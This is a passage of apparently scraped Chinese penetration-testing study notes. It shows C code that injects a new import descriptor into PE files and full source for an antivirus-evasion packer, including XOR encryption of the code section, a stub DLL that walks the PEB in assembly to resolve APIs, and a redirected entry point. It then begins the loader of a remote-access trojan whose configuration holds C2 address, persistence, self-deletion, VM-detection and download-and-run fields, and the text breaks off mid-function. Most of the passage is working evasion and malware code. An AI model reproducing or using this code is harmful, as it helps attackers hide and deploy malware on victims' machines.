title="进程创建期修改PE输入表法："></a>进程创建期修改PE输入表法：</h4><p>1.以挂起方式创建目标进程<br>2.获取目标进程中的PE结构信息<br>3.获取原IID大小，增加一项，搜索可用的节空隙<br>4.构造心的IID及其相关的OriginalFirstThunk、Name和FirstThunk结构<br>5.修正PE映像头<br>6.更新目标进程的内存。<br>7.继续运行主线程</p><p>据上述原理介绍，对代码的流程可以如此梳理：</p><p>1.写一个我们自己的输入表IID结构<br>1.新增一个节（块section）来保存旧的输入表IID结构数组和我们新加的输入表IID结构<br>2.因为新加了节，我们就需要增加一个节表指向我们新加的节<br>3.因为新加了节和节表就需要更改PE文件头的信息</p><ul><li>新增节用来存储新导入表</li><li>复制默认导入表数据到新增节起始位置,并修正IMAGE_OPTIONAL_HEADER目录项中VirtualAddress</li><li>在默认导入表结构后追加一个导入表并修正其成员.</li><li>Name,开辟一块空间存储DLL名,并修正Name指向(RVA)</li><li>OriginalFirstThunk,指向结构体数组IMAGE_THUNK_DATA32,至少导入一个函数否则系统不会加载此模块</li><li>开辟8字节内存,前4字节存储函数名(RVA)指向IMAGE_IMPORT_BY_NAME,后4字节设置0即可.</li><li>FirstThunk,同设置INT表相同,开辟对应空间初始化即可</li></ul><h2 id="导入表（IAT）高级玩法实现读取文件（三）"><a href="#导入表（IAT）高级玩法实现读取文件（三）" class="headerlink" title="导入表（IAT）高级玩法实现读取文件（三）"></a>导入表（IAT）高级玩法实现读取文件（三）</h2><pre class="line-numbers language-none"><code class="language-none">PVOID FileToMem(IN PCHAR szFilePath, OUT LPDWORD dwFileSize){//打开文件FILE* pFile = fopen(szFilePath, "rb");if (!pFile){printf("FileToMem fopen Fail \r\n");return NULL;} //获取文件长度fseek(pFile, 0, SEEK_END);//SEEK_END文件结尾DWORD Size = ftell(pFile);fseek(pFile, 0, SEEK_SET);//SEEK_SET文件开头 //申请存储文件数据缓冲区PCHAR pFileBuffer = (PCHAR)malloc(Size);if (!pFileBuffer){printf("FileToMem malloc Fail \r\n");fclose(pFile);return NULL;} //读取文件数据fread(pFileBuffer, Size, 1, pFile); //判断是否为可执行文件if (*(PSHORT)pFileBuffer != IMAGE_DOS_SIGNATURE){printf("Error: MZ \r\n");fclose(pFile);free(pFileBuffer);return NULL;} if (*(PDWORD)(pFileBuffer + *(PDWORD)(pFileBuffer + 0x3C)) != IMAGE_NT_SIGNATURE){printf("Error: PE \r\n");fclose(pFile);free(pFileBuffer);return NULL;} if (dwFileSize){*dwFileSize = Size;} fclose(pFile); return pFileBuffer;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="导入表（IAT）高级玩法实现输出文件（四）"><a href="#导入表（IAT）高级玩法实现输出文件（四）" class="headerlink" title="导入表（IAT）高级玩法实现输出文件（四）"></a>导入表（IAT）高级玩法实现输出文件（四）</h2><pre class="line-numbers language-none"><code class="language-none">VOID MemToFile(IN PCHAR szFilePath, IN PVOID pFileBuffer, IN DWORD dwFileSize){//打开文件FILE* pFile = fopen(szFilePath, "wb");if (!pFile){printf("MemToFile fopen Fail \r\n");return;} //输出文件fwrite(pFileBuffer, dwFileSize, 1, pFile); fclose(pFile);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="导入表（IAT）高级玩法实现输入函数（五）"><a href="#导入表（IAT）高级玩法实现输入函数（五）" class="headerlink" title="导入表（IAT）高级玩法实现输入函数（五）"></a>导入表（IAT）高级玩法实现输入函数（五）</h2><pre class="line-numbers language-none"><code class="language-none">VOID ImportInject(PCHAR szModuleName, PCHAR szFunName){//读取文件二进制数据DWORD dwFileSize = 0;PCHAR pFileBuffer = FileToMem(FILE_PATH_IN, &amp;dwFileSize);if (!pFileBuffer){return;} //新增节存储导入表pFileBuffer = AddNewSection(pFileBuffer, 0x6000, &amp;dwFileSize); //定位结构PIMAGE_DOS_HEADERpDos = (PIMAGE_DOS_HEADER)pFileBuffer;PIMAGE_NT_HEADERSpNth = (PIMAGE_NT_HEADERS)(pFileBuffer + pDos-&gt;e_lfanew);PIMAGE_FILE_HEADERpFil = (PIMAGE_FILE_HEADER)((PUCHAR)pNth + 4);PIMAGE_OPTIONAL_HEADER32pOpo = (PIMAGE_OPTIONAL_HEADER32)((PUCHAR)pFil + IMAGE_SIZEOF_FILE_HEADER);PIMAGE_SECTION_HEADERpSec = (PIMAGE_SECTION_HEADER)((PUCHAR)pOpo + pFil-&gt;SizeOfOptionalHeader); //判断该PE文件是否有导入表if (!pOpo-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress){printf("该PE文件不存在导入表 \r\n");return;}PIMAGE_IMPORT_DESCRIPTOR pImp = (PIMAGE_IMPORT_DESCRIPTOR)(pFileBuffer + RvaToFoa(pFileBuffer, pOpo-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)); //修复可选PE头中目录项指向PUCHAR pCurrent = pFileBuffer + pSec[pFil-&gt;NumberOfSections - 1].PointerToRawData;pOpo-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = FoaToRva(pFileBuffer, pCurrent - pFileBuffer); //拷贝默认导入表数据memcpy(pCurrent, pImp, pOpo-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size - sizeof(IMAGE_IMPORT_DESCRIPTOR));//最后一个导入表后跟随一块同导入表结构大小的0数据.pCurrent += pOpo-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size - sizeof(IMAGE_IMPORT_DESCRIPTOR); //修正新导入表数据PIMAGE_IMPORT_DESCRIPTOR pNew = (PIMAGE_IMPORT_DESCRIPTOR)pCurrent;pNew-&gt;ForwarderChain = -1;pNew-&gt;TimeDateStamp = 0; //新增导入表后填充0数据memset(pCurrent + sizeof(IMAGE_IMPORT_DESCRIPTOR), 0, sizeof(IMAGE_IMPORT_DESCRIPTOR));pCurrent += sizeof(IMAGE_IMPORT_DESCRIPTOR); //INTpNew-&gt;OriginalFirstThunk = FoaToRva(pFileBuffer, pCurrent - pFileBuffer);PDWORD pInt = (PDWORD)pCurrent;memset(pInt, 0, 8);pCurrent += 8; //IAT//IAT表地址必须为4字节对齐pNew-&gt;FirstThunk = FoaToRva(pFileBuffer, pCurrent - pFileBuffer);PDWORD pIat = (PDWORD)pCurrent;memset(pIat, 0, 8);pCurrent += 8; //IMAGE_IMPORT_BY_NAME.HINTDWORD dwData = (DWORD)pCurrent;*(PWORD)pCurrent = 0;pCurrent += 2; //IMAGE_IMPORT_BY_NAME.NameDWORD dwFunNameSize = strlen(szFunName) + 1;memcpy(pCurrent, szFunName, dwFunNameSize);pCurrent += dwFunNameSize; //修复INT IAT指向数据*pInt = FoaToRva(pFileBuffer, dwData - (DWORD)pFileBuffer);*pIat = FoaToRva(pFileBuffer, dwData - (DWORD)pFileBuffer); //拷贝Name数据DWORD dwModuleNameSize = strlen(szModuleName) + 1;memcpy(pCurrent, szModuleName, dwModuleNameSize);//修正结构Name指向pNew-&gt;Name = FoaToRva(pFileBuffer, pCurrent - pFileBuffer);pCurrent += dwModuleNameSize; //将二进制数据输出到文件MemToFile(FILE_PATH_OUT, pFileBuffer, dwFileSize); }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.19-gao-ji-mian-sha-ke-kai-fa-yuan-li/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.19-gao-ji-mian-sha-ke-kai-fa-yuan-li/</url>
      
        <content type="html"><![CDATA[<h2 id="完整高级免杀壳开发原理（一）"><a href="#完整高级免杀壳开发原理（一）" class="headerlink" title="完整高级免杀壳开发原理（一）"></a>完整高级免杀壳开发原理（一）</h2><p>用010editor手工加壳了解下原理：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1653292413039/f8a4ba81f9c5435aa3eea97317a5baea.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1653292413039/84916650c4c642adb15d942bd31efe25.png" alt="image.png"></p><h4 id="加壳处理流程"><a href="#加壳处理流程" class="headerlink" title="加壳处理流程"></a>加壳处理流程</h4><p>1读取加壳文件，外壳DLL<br>2:选择加壳文件需要压缩的地方，对于资源段选择不压缩，其他区段都进行压缩。<br>3:重新构造区段表，分别有这么几个区段 .OldDat(原始压缩的数据) .Shell(外壳DLL代码) .tls(用来支持加壳tls程序) .CRT(用来支持加壳tls程序) .reloc(外壳DLL重定位信息) .rcsc(资源如果有的话)<br>4:利用aPLib进行压缩，将压缩之后的数据复制到目标文件.OldDat区段缓冲区。<br>5:对于外壳DLL进行重定位，资源数据修复<br>6:设置导出变量的数据，在外壳DLL中将使用到的变量<br>7:写入文件</p><h2 id="完整高级免杀壳手工分析（二）"><a href="#完整高级免杀壳手工分析（二）" class="headerlink" title="完整高级免杀壳手工分析（二）"></a>完整高级免杀壳手工分析（二）</h2><p>即我们向PE文件添加一个区段并将其设置为入口点，这样PE文件最开始执行的命令就是我们添加的区段也就是壳的指令，壳对加密区进行解密，对压缩区进行解压，将原本的EXE文件还原出来，然后跳转至原程序入口，程序照常运行。</p><p>首先生成一个打印hello的exe文件。</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;int main() {printf("hello");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们目前要干的事情是:以手动的形式向PE文件添加一个壳部分并设为程序入口，并使其能跳转回原入口。 那就来吧</p><p>用010editor打开我们的exe文件，启用exe模板分析。 我们首先修改其文件头numverofsection属性，这个属性用来定义当前PE文件存在多少个区段,因为我们要添加一个壳区段，所以我们将其加1变成6</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1653292413039/9dac72eb381245eaa3a34b78a168298c.png" alt="image.png"></p><p>在我们重载模板后我们就会在区段表发现多出来一个空的区段表</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1653292413039/638f4e4d9c364aba804a49c70c5df41c.png" alt="image.png"></p><p>从上到下各个比较重要字段的意思是 \1. Name 表示该区段的名字 2.VirtualSize 表示在内存中的大小(一般内存对齐为0x1000) 3.virtualaddress 虚拟地址 即上一个区段的VirtualAddress + 上一个区段经内存对齐粒度对齐后的大小 4.sizeofdata 表示在文件中的大小（一般文件对齐为0x200) 5.pointertorawdata 文件的偏移 即 上一个区段的PointerToRawData + 上一个区段的SizeOfRawData</p><p>然后我们通过修改以上各值来定义一个新区段（壳区段)的属性</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1653292413039/851256559f7647e6b5b2ff69d1879326.png" alt="image.png"></p><h2 id="完整高级免杀壳源码开发（三）"><a href="#完整高级免杀壳源码开发（三）" class="headerlink" title="完整高级免杀壳源码开发（三）"></a>完整高级免杀壳源码开发（三）</h2><pre class="line-numbers language-none"><code class="language-none">流程部分：#include &lt;Windows.h&gt;//#include "stdafx.h"#include &lt;tchar.h&gt;#include &lt;stdio.h&gt;#include "PE.h"int main() {//打开被加壳文件char PePath[] = "C:\\Users\\test\\Downloads\\PackingEXE-master\\PackingEXE-master\\jiake\\Release\\Server.exe";DWORD PeSize;char* PeHmoudle = GetFileHmoudle(PePath,&amp;PeSize);//加载stubStubInfo pstub = { 0 };LoadStub(&amp;pstub); //加密代码段DWORD textRVA = GetSecByName(PeHmoudle, ".text")-&gt;VirtualAddress;DWORD textSize = GetSecByName(PeHmoudle, ".text")-&gt;Misc.VirtualSize;Encry(PeHmoudle,pstub);//添加新区段char SecName[] = ".fuck";char* PeNewHmoudle = AddSec(PeHmoudle, PeSize, SecName, GetSecByName(pstub.dllbase, ".text")-&gt;Misc.VirtualSize);//stub重定位修复FixStub(GetOptHeader(PeNewHmoudle)-&gt;ImageBase,(DWORD)pstub.dllbase,GetLastSec(PeNewHmoudle)-&gt;VirtualAddress,GetSecByName(pstub.dllbase,".text")-&gt;VirtualAddress);auto b = (DWORD*)GetProcAddress((HMODULE)pstub.dllbase, "OriginEntry");pstub.pStubConf-&gt;srcOep = GetOptHeader(PeNewHmoudle)-&gt;AddressOfEntryPoint;  //获取原入口点//stub移植memcpy(GetLastSec(PeNewHmoudle)-&gt;PointerToRawData+ PeNewHmoudle,GetSecByName(pstub.dllbase, ".text")-&gt;VirtualAddress+pstub.dllbase,GetSecByName(pstub.dllbase,".text")-&gt;Misc.VirtualSize);////入口点修改GetOptHeader(PeNewHmoudle)-&gt;AddressOfEntryPoint =pstub.pfnStart-(DWORD)pstub.dllbase-GetSecByName(pstub.dllbase,".text")-&gt;VirtualAddress+GetLastSec(PeNewHmoudle)-&gt;VirtualAddress;auto a =pstub.pfnStart-(DWORD)pstub.dllbase-GetSecByName(pstub.dllbase,".text")-&gt;VirtualAddress+GetLastSec(PeNewHmoudle)-&gt;VirtualAddress;auto d =GetProcAddress((HMODULE)pstub.dllbase, "OriginEntry");//去随机基址GetOptHeader(PeNewHmoudle)-&gt;DllCharacteristics &amp;= (~0x40);//保存文件SaveFile("C:\\Users\\test\\Downloads\\PackingEXE-master\\PackingEXE-master\\jiake\\Release\\fuck.exe", PeNewHmoudle, PeSize);return 0;}////////////////////////////////////////////////////////////////////////////////////////////////////#include &lt;Windows.h&gt;typedef struct _StubConf{DWORD srcOep;//入口点DWORD textScnRVA;//代码段RVADWORD textScnSize;//代码段的大小DWORD key;//解密密钥}StubConf;struct StubInfo{char* dllbase;//stub.dll的加载基址DWORD pfnStart;//stub.dll(start)导出函数的地址StubConf* pStubConf;//stub.dll(g_conf)导出全局变量的地址};//***********************//PE信息获取函数簇//time:2020/11/2//***********************PIMAGE_DOS_HEADER GetDosHeader(_In_ char* pBase) {return PIMAGE_DOS_HEADER(pBase);}PIMAGE_NT_HEADERS GetNtHeader(_In_ char* pBase) {return PIMAGE_NT_HEADERS(GetDosHeader(pBase)-&gt;e_lfanew+(SIZE_T)pBase);}PIMAGE_FILE_HEADER GetFileHeader(_In_ char* pBase) {return &amp;(GetNtHeader(pBase)-&gt;FileHeader);}PIMAGE_OPTIONAL_HEADER32 GetOptHeader(_In_ char* pBase) {return &amp;(GetNtHeader(pBase)-&gt;OptionalHeader);}PIMAGE_SECTION_HEADER GetLastSec(_In_ char* pBase) {DWORD SecNum = GetFileHeader(pBase)-&gt;NumberOfSections;PIMAGE_SECTION_HEADER FirstSec = IMAGE_FIRST_SECTION(GetNtHeader(pBase));PIMAGE_SECTION_HEADER LastSec = FirstSec + SecNum - 1;return LastSec;}PIMAGE_SECTION_HEADER GetSecByName(_In_ char* pBase,_In_ const char* name) {DWORD Secnum = GetFileHeader(pBase)-&gt;NumberOfSections;PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(GetNtHeader(pBase));char buf[10] = { 0 };for (DWORD i = 0; i &lt; Secnum; i++) {memcpy_s(buf, 8, (char*)Section[i].Name, 8);if (!strcmp(buf, name)) {return Section + i;}}return nullptr;}//**********************//打开文件返回句柄//time:2020/11/2//*********************char* GetFileHmoudle(_In_ const char* path,_Out_opt_ DWORD* nFileSize) {//打开一个文件并获得文件句柄HANDLE hFile = CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);//获得文件大小DWORD FileSize = GetFileSize(hFile, NULL);//返回文件大小到变量nFileSizeif(nFileSize)*nFileSize = FileSize;//申请一片大小为FileSize的内存并将指针置于首位char* pFileBuf = new CHAR[FileSize]{ 0 };//给刚刚申请的内存读入数据DWORD dwRead;ReadFile(hFile, pFileBuf, FileSize, &amp;dwRead, NULL);CloseHandle(hFile);return pFileBuf;}//****************//对齐处理//time:2020/11/5//****************int AlignMent(_In_ int size, _In_ int alignment) {return (size) % (alignment)==0 ? (size) : ((size) / alignment+1) * (alignment);}//*********************//增添区段//time:2020/11/6//*********************char* AddSec(_In_ char*&amp; hpe, _In_ DWORD&amp; filesize, _In_ const char* secname, _In_ const int secsize) {GetFileHeader(hpe)-&gt;NumberOfSections++;PIMAGE_SECTION_HEADER pesec = GetLastSec(hpe);//设置区段表属性memcpy(pesec-&gt;Name, secname, 8);pesec-&gt;Misc.VirtualSize = secsize;pesec-&gt;VirtualAddress = (pesec - 1)-&gt;VirtualAddress + AlignMent((pesec - 1)-&gt;SizeOfRawData,GetOptHeader(hpe)-&gt;SectionAlignment);pesec-&gt;SizeOfRawData = AlignMent(secsize, GetOptHeader(hpe)-&gt;FileAlignment);pesec-&gt;PointerToRawData = AlignMent(filesize,GetOptHeader(hpe)-&gt;FileAlignment);pesec-&gt;Characteristics = 0xE00000E0;//设置OPT头映像大小GetOptHeader(hpe)-&gt;SizeOfImage = pesec-&gt;VirtualAddress + pesec-&gt;SizeOfRawData;//扩充文件数据int newSize = pesec-&gt;PointerToRawData + pesec-&gt;SizeOfRawData;char* nhpe = new char [newSize] {0};//向新缓冲区录入数据memcpy(nhpe, hpe, filesize);//缓存区更替delete hpe;filesize = newSize;return nhpe;}//******************//保存文件//time:2020/11/6//******************void SaveFile(_In_ const char* path, _In_ const char* data, _In_ int FileSize) {HANDLE hFile = CreateFileA(path,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);DWORD Buf = 0;WriteFile(hFile, data, FileSize, &amp;Buf,NULL);CloseHandle(hFile);}//*******************//加载stub//time://******************//void StubLoad (_In_ StubInfo* pStub) {////}void FixStub(DWORD targetDllbase, DWORD stubDllbase,DWORD targetNewScnRva,DWORD stubTextRva ){//找到stub.dll的重定位表DWORD dwRelRva = GetOptHeader((char*)stubDllbase)-&gt;DataDirectory[5].VirtualAddress;IMAGE_BASE_RELOCATION* pRel = (IMAGE_BASE_RELOCATION*)(dwRelRva + stubDllbase);//遍历重定位表while (pRel-&gt;SizeOfBlock){struct TypeOffset{WORD offset : 12;WORD type : 4;};TypeOffset* pTypeOffset = (TypeOffset*)(pRel + 1);DWORD dwCount = (pRel-&gt;SizeOfBlock - 8) / 2;//需要重定位的数量for (int i = 0; i &lt; dwCount; i++){if (pTypeOffset[i].type != 3){continue;}//需要重定位的地址DWORD* pFixAddr = (DWORD*)(pRel-&gt;VirtualAddress + pTypeOffset[i].offset + stubDllbase);DWORD dwOld;//修改属性为可写VirtualProtect(pFixAddr, 4, PAGE_READWRITE, &amp;dwOld);//去掉dll当前加载基址*pFixAddr -= stubDllbase;//去掉默认的段首RVA*pFixAddr -= stubTextRva;//换上目标文件的加载基址*pFixAddr += targetDllbase;//加上新区段的段首RVA*pFixAddr += targetNewScnRva;//把属性修改回去VirtualProtect(pFixAddr, 4, dwOld, &amp;dwOld);}//切换到下一个重定位块pRel = (IMAGE_BASE_RELOCATION*)((DWORD)pRel + pRel-&gt;SizeOfBlock);}}//******************//加密代码段//time://******************void Encry(_In_ char* hpe,_In_ StubInfo pstub) {//获取代码段首地址BYTE* TargetText = GetSecByName(hpe, ".text")-&gt;PointerToRawData + (BYTE*)hpe;//获取代码段大小DWORD TargetTextSize = GetSecByName(hpe, ".text")-&gt;Misc.VirtualSize;//加密代码段for (int i = 0; i &lt; TargetTextSize; i++) {TargetText[i] ^= 0x15;}pstub.pStubConf-&gt;textScnRVA = GetSecByName(hpe, ".text")-&gt;VirtualAddress;pstub.pStubConf-&gt;textScnSize = TargetTextSize;pstub.pStubConf-&gt;key = 0x15;}void LoadStub(_In_ StubInfo* pstub) {pstub-&gt;dllbase = (char*)LoadLibraryEx(L"stubdll.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);pstub-&gt;pfnStart = (DWORD)GetProcAddress((HMODULE)pstub-&gt;dllbase, "Start");pstub-&gt;pStubConf = (StubConf*)GetProcAddress((HMODULE)pstub-&gt;dllbase, "g_conf");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="完整高级免杀壳源码开发（四）"><a href="#完整高级免杀壳源码开发（四）" class="headerlink" title="完整高级免杀壳源码开发（四）"></a>完整高级免杀壳源码开发（四）</h2><pre class="line-numbers language-none"><code class="language-none">stubdll shellcode模块部分：// 合并.data到.text段#pragma comment(linker,"/merge:.data=.text")// 合并.rdata到.text段#pragma comment(linker,"/merge:.rdata=.text")// 将.text改成可读可写可执行#pragma comment(linker, "/section:.text,RWE")#include &lt;Windows.h&gt;typedef struct _StubConf{DWORD srcOep;//入口点DWORD textScnRVA;//代码段RVADWORD textScnSize;//代码段的大小DWORD key;//解密密钥}StubConf;//导出一个全局变量extern "C" __declspec(dllexport)StubConf g_conf = { 0 };//定义函数指针和变量typedef void* (WINAPI* FnGetProcAddress)(HMODULE, const char*);FnGetProcAddress MyGetProcAddress;typedef void* (WINAPI* FnLoadLibraryA)(char*);FnLoadLibraryA MyLoadLibraryA;typedef void* (WINAPI* FnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);FnVirtualProtect MyVirtualProtect;void Decrypt(){unsigned char* pText = (unsigned char*)g_conf.textScnRVA + 0x400000;//修改代码段的属性DWORD old = 0;MyVirtualProtect(pText, g_conf.textScnSize, PAGE_READWRITE, &amp;old);//解密代码段for (DWORD i = 0; i &lt; g_conf.textScnSize; i++){pText[i] ^= g_conf.key;}//把属性修改回去MyVirtualProtect(pText, g_conf.textScnSize, old, &amp;old);}void GetApis(){HMODULE hKernel32;_asm{pushad;; //获取kernel32.dll的加载基址;;// 1. 找到PEB的首地址;mov eax, fs: [0x30] ;mov eax, [eax + 0ch];mov eax, [eax + 0ch];mov eax, [eax];mov eax, [eax];mov eax, [eax + 018h];mov hKernel32, eax;mov ebx, [eax + 03ch];add ebx, eax;add ebx, 078h;mov ebx, [ebx];add ebx, eax;lea ecx, [ebx + 020h];mov ecx, [ecx]; // ecx =&gt; 名称表的首地址(rva);add ecx, eax; // ecx =&gt; 名称表的首地址(va);xor edx, edx; // 作为index来使用._WHILE:;mov esi, [ecx + edx * 4];lea esi, [esi + eax];cmp dword ptr[esi], 050746547h; 47657450 726F6341 64647265 7373;jne _LOOP;cmp dword ptr[esi + 4], 041636f72h;jne _LOOP;cmp dword ptr[esi + 8], 065726464h;jne _LOOP;cmp word  ptr[esi + 0ch], 07373h;jne _LOOP;mov edi, [ebx + 024h];add edi, eax;mov di, [edi + edx * 2];and edi, 0FFFFh;mov edx, [ebx + 01ch];add edx, eax;mov edi, [edx + edi * 4];add edi, eax; ;mov MyGetProcAddress, edi;jmp _ENDWHILE;_LOOP:;inc edx; // ++index;jmp _WHILE;_ENDWHILE:;popad;}MyLoadLibraryA = (FnLoadLibraryA)MyGetProcAddress(hKernel32, "LoadLibrary");MyVirtualProtect = (FnVirtualProtect)MyGetProcAddress(hKernel32, "VirtualProtect");}extern "C" __declspec(dllexport) __declspec(naked)void Start(){//获取函数的API地址GetApis();//解密代码段Decrypt();//跳转到原始OEP__asm{mov eax, g_conf.srcOep;add eax, 0x400000jmp eax}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.9-cong-yuan-ma-jie-jue-rat-mian-sha-wen-ti-xia/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.9-cong-yuan-ma-jie-jue-rat-mian-sha-wen-ti-xia/</url>
      
        <content type="html"><![CDATA[<h2 id="红队商业版RAT框架源码免杀解读（一）"><a href="#红队商业版RAT框架源码免杀解读（一）" class="headerlink" title="红队商业版RAT框架源码免杀解读（一）"></a>红队商业版RAT框架源码免杀解读（一）</h2><pre class="line-numbers language-none"><code class="language-none">// Loader.cpp : Defines the entry point for the application.//#include "stdafx.h"#include "ShellCode.h"#include "MemLoadDll.h"//配置信息结构体struct MODIFY_DATA{TCHAR szDns[300];//上线地址TCHAR dwPort[32];//上线端口TCHAR szGroup[50];//上线分组TCHAR szVersion[32];//上线版本TCHAR szGetGroup[256];//分组唯一标识BOOL  bRunOnce;         //是否为绿色安装BOOL  bRuns;            //是否是启动目录启动BOOL  bService;         //是否是服务启动TCHAR SerName[100];     //服务名称 TCHAR Serdisplay[128];  //显示名称 TCHAR Serdesc[256];     //服务描述 TCHAR ReleasePath[100]; //安装途径 TCHAR ReleaseName[50];  //安装名称WORD FileAttribute;      //文件属性BOOL  bLanPenetrate;    //超级复活CHAR Mexi[100];          //运行互斥WORD  Dele_zd;          //安装增大BOOL Dele_te;            //安装自删除BOOL Fvm;            //vmBOOL Dele_fs;            //占坑防删除安装BOOL Fhb;           //哈波BOOL Zjz;BOOL fsc;CHAR szDownRun[512];   //下载运行地址}modify_data = {"           D         ","","","","",TRUE,//TRUE为绿色安装，FALSE为标准安装TRUE,//TRUE为启动目录启动    TRUE,//TRUE为服务启动"","","","","",FILE_ATTRIBUTE_NORMAL,    //文件属性FALSE,"Cao360",0,FALSE,FALSE,FALSE,FALSE,FALSE,FALSE,"",};void DecrypMain(char *Buff, int Size, char *AddTable){for (int i=0, j=0; i&lt;Size; i++){Buff[i] ^= AddTable[j++] % 1753 + 